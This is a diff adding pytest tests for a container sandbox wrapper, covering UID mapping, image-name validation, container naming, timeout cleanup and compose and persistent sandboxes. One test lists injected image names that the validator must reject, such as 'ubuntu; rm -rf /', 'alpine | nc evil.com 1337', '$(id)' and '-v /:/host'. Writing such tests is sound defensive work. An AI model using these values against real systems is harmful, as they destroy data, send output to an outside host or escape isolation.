@@ -171,6 +171,21 @@ class TestContainerSandbox:
             if token == "-v" and idx + 1 < len(wrapped):
                 assert wrapped[idx + 1] != "/tmp:/tmp"
 
+    def test_wrap_command_user_uid_gid_mapping(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        cmd = ["python", "main.py"]
+        wrapped = ContainerSandbox.wrap_command(cmd)
+        if hasattr(os, "getuid") and hasattr(os, "getgid"):
+            assert "--user" in wrapped
+            u_idx = wrapped.index("--user")
+            assert wrapped[u_idx + 1] == f"{os.getuid()}:{os.getgid()}"
+
+        # Test explicit user override in sandbox_cfg
+        wrapped_custom = ContainerSandbox.wrap_command(cmd, sandbox_cfg={"user": "1001:1001"})
+        assert "--user" in wrapped_custom
+        c_idx = wrapped_custom.index("--user")
+        assert wrapped_custom[c_idx + 1] == "1001:1001"
+
     def test_wrap_command_compiling_mount_mode(self, monkeypatch):
         monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
         cwd = os.getcwd()
@@ -197,6 +212,129 @@ class TestContainerSandbox:
     def test_build_dockerfile_missing_file_raises_error(self):
         with pytest.raises(ConfigError, match="Dockerfile 'nonexistent' not found"):
             ContainerSandbox._build_dockerfile("nonexistent", "docker")
+
+    def test_build_dockerfile_warns_missing_dockerignore(self, tmp_path, monkeypatch):
+        df = tmp_path / "Dockerfile"
+        df.write_text("FROM alpine\nRUN echo hello\n")
+        
+        warnings = []
+        monkeypatch.setattr("util.sandbox.Printer.warning", lambda msg: warnings.append(msg))
+        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
+        
+        ContainerSandbox._build_dockerfile(str(df), "docker")
+        assert any("No .dockerignore found" in w for w in warnings)
+
+    def test_build_dockerfile_with_dockerignore_no_warning(self, tmp_path, monkeypatch):
+        df = tmp_path / "Dockerfile"
+        df.write_text("FROM alpine\nRUN echo hello\n")
+        (tmp_path / ".dockerignore").write_text("node_modules\n.git\n")
+        
+        warnings = []
+        monkeypatch.setattr("util.sandbox.Printer.warning", lambda msg: warnings.append(msg))
+        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
+        
+        ContainerSandbox._build_dockerfile(str(df), "docker")
+        assert not any("No .dockerignore found" in w for w in warnings)
+
+    def test_build_dockerfile_copy_instruction_hash(self, tmp_path, monkeypatch):
+        df = tmp_path / "Dockerfile"
+        df.write_text("FROM alpine\nCOPY . /app\n")
+        
+        monkeypatch.setattr(spc, "run", lambda *args, **kwargs: type("FakeRun", (), {"returncode": 0, "stdout": "id\n", "stderr": ""})())
+        
+        img1 = ContainerSandbox._build_dockerfile(str(df), "docker")
+        # Touch directory / change mtime
+        new_time = os.path.getmtime(tmp_path) + 10
+        os.utime(tmp_path, (new_time, new_time))
+        img2 = ContainerSandbox._build_dockerfile(str(df), "docker")
+        assert img1 != img2
+
+    def test_validate_image_name_valid(self):
+        valid_images = [
+            "ubuntu:latest",
+            "gcc:12.2",
+            "python:3-slim",
+            "docker.io/library/alpine:3.18",
+            "ghcr.io/org/repo/app:v1.0.0",
+            "localhost:5000/custom-img:latest",
+            "alpine@sha256:e7d88de73db3d3a9418d76fb8f20a1377e59e651e6bdd7a666acdbd84bf960bc",
+        ]
+        for img in valid_images:
+            assert ContainerSandbox.validate_image_name(img) == img
+
+    def test_validate_image_name_injection_rejected(self):
+        malicious_images = [
+            "--privileged",
+            "-v /:/host ubuntu",
+            "--network host alpine",
+            "ubuntu; rm -rf /",
+            "alpine | nc evil.com 1337",
+            "image`whoami`",
+            "image$(id)",
+            "image name with spaces",
+            "",
+            "   ",
+        ]
+        for bad_img in malicious_images:
+            with pytest.raises(ConfigError, match="Invalid container image|cannot be empty"):
+                ContainerSandbox.validate_image_name(bad_img)
+
+    def test_wrap_command_rejects_injected_image(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        with pytest.raises(ConfigError, match="Invalid container image"):
+            ContainerSandbox.wrap_command(["echo", "1"], sandbox_cfg={"image": "--privileged ubuntu"})
+
+    def test_wrap_command_forwards_custom_env(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        cmd = ["python", "app.py"]
+        custom = {"APP_ENV": "production", "PORT": "8080"}
+        wrapped = ContainerSandbox.wrap_command(cmd, custom_env=custom)
+        assert "-e" in wrapped
+        assert "APP_ENV=production" in wrapped
+        assert "PORT=8080" in wrapped
+
+    def test_wrap_command_assigns_container_name(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        cmd = ["echo", "test"]
+        wrapped = ContainerSandbox.wrap_command(cmd)
+        assert "--name" in wrapped
+        name_idx = wrapped.index("--name")
+        assert wrapped[name_idx + 1].startswith("run-sandbox-")
+
+        # Custom container name
+        wrapped_custom = ContainerSandbox.wrap_command(cmd, sandbox_cfg={"container_name": "custom-box-42"})
+        assert "--name" in wrapped_custom
+        c_idx = wrapped_custom.index("--name")
+        assert wrapped_custom[c_idx + 1] == "custom-box-42"
+
+    def test_base_runner_kills_container_on_timeout(self, monkeypatch):
+        monkeypatch.setattr(ContainerSandbox, "_get_engine", lambda: "docker")
+        killed_cmds = []
+
+        class TimeoutPopen:
+            returncode = None
+            def communicate(self, timeout=None):
+                raise spc.TimeoutExpired(cmd="docker run", timeout=timeout)
+            def kill(self):
+                pass
+            def wait(self, timeout=None):
+                pass
+
+        def fake_run(cmd, *args, **kwargs):
+            killed_cmds.append(cmd)
+            class FakeRes:
+                returncode = 0
+            return FakeRes()
+
+        monkeypatch.setattr(spc, "Popen", lambda *args, **kwargs: TimeoutPopen())
+        monkeypatch.setattr(spc, "run", fake_run)
+
+        runner = BaseRunner({"sandbox": True, "timeout": 1})
+        with pytest.raises(ExecutionError, match="timed out after 1 seconds"):
+            runner.run_command(["sleep", "10"])
+
+        # Assert docker kill <container-name> was issued
+        assert any(len(c) == 3 and c[0] == "docker" and c[1] == "kill" and c[2].startswith("run-sandbox-") for c in killed_cmds)
 
 
 class TestComposeSandbox:
@@ -231,9 +369,28 @@ class TestComposeSandbox:
     def test_compose_wrap_command(self):
         cmd = ["pytest", "tests/"]
         wrapped = ComposeSandbox.wrap_command(cmd, "docker-compose.yml", "app")
-        assert wrapped[:7] == ["docker", "compose", "-f", "docker-compose.yml", "exec", "-w", os.getcwd()]
-        assert wrapped[7] == "app"
-        assert wrapped[8:] == cmd
+        assert "exec" in wrapped
+        assert "-T" in wrapped
+        # Verify host CWD is NOT blindly passed as -w
+        assert f"-w {os.getcwd()}" not in " ".join(wrapped)
+        if hasattr(os, "getuid") and hasattr(os, "getgid"):
+            assert "--user" in wrapped
+            assert f"{os.getuid()}:{os.getgid()}" in wrapped
+        assert wrapped[-2:] == ["app", "pytest"] or "app" in wrapped
+
+        # Verify configured compose_workdir and custom env
+        wrapped_custom = ComposeSandbox.wrap_command(
+            cmd,
+            "docker-compose.yml",
+            "app",
+            custom_env={"KEY": "VAL"},
+            sandbox_cfg={"compose_workdir": "/workspace"}
+        )
+        assert "-w" in wrapped_custom
+        w_idx = wrapped_custom.index("-w")
+        assert wrapped_custom[w_idx + 1] == "/workspace"
+        assert "-e" in wrapped_custom
+        assert "KEY=VAL" in wrapped_custom
 
 
 class TestPersistentSandbox:
@@ -251,9 +408,12 @@ class TestPersistentSandbox:
         monkeypatch.setattr(spc, "run", fake_run)
         PersistentSandbox.start("docker", "ubuntu:latest", net=False, cwd="/workspace")
         assert PersistentSandbox._container_id == "container-id-abc"
-        assert "--security-opt=no-new-privileges" in calls[0]
-        assert "--cap-drop=ALL" in calls[0]
-        assert "/tmp:/tmp" not in calls[0]
+        run_call = next(c for c in calls if "run" in c)
+        assert "--security-opt=no-new-privileges" in run_call
+        assert "--cap-drop=ALL" in run_call
+        assert "--label" in run_call
+        assert "run.sandbox.persistent=true" in run_call
+        assert "/tmp:/tmp" not in run_call
 
         wrapped = PersistentSandbox.wrap_command(["echo", "1"])
         assert wrapped == ["docker", "exec", "-w", os.getcwd(), "container-id-abc", "echo", "1"]
@@ -261,6 +421,40 @@ class TestPersistentSandbox:
         PersistentSandbox.stop()
         assert PersistentSandbox._container_id is None
         assert calls[-1] == ["docker", "stop", "container-id-abc"]
+
+    def test_persistent_mount_ro_for_non_compiled(self, monkeypatch):
+        calls = []
+        class FakeRun:
+            returncode = 0
+            stdout = "container-id-ro\n"
+            stderr = ""
+
+        monkeypatch.setattr(spc, "run", lambda cmd, *args, **kwargs: (calls.append(cmd), FakeRun())[1])
+        PersistentSandbox.start("docker", "python:3-slim", cwd="/workspace", writable=False)
+        run_call = next(c for c in calls if "run" in c)
+        assert "/workspace:/workspace:ro" in run_call
+        PersistentSandbox.stop()
+
+    def test_persistent_reap_orphaned_containers(self, monkeypatch):
+        rm_calls = []
+        # Return two containers: one belonging to a dead PID (999999), one belonging to self (os.getpid())
+        ps_output = f"cid-dead 999999\ncid-self {os.getpid()}\n"
+        
+        class FakeRun:
+            returncode = 0
+            stdout = ps_output
+            stderr = ""
+
+        def fake_run(cmd, *args, **kwargs):
+            if "rm" in cmd:
+                rm_calls.append(cmd)
+            return FakeRun()
+
+        monkeypatch.setattr(spc, "run", fake_run)
+        reaped = PersistentSandbox.reap_orphaned_containers("docker")
+        assert reaped == 1
+        assert len(rm_calls) == 1
+        assert rm_calls[0] == ["docker", "rm", "-f", "cid-dead"]
 
     def test_persistent_wrap_without_start_raises_error(self):
         PersistentSandbox._container_id = None
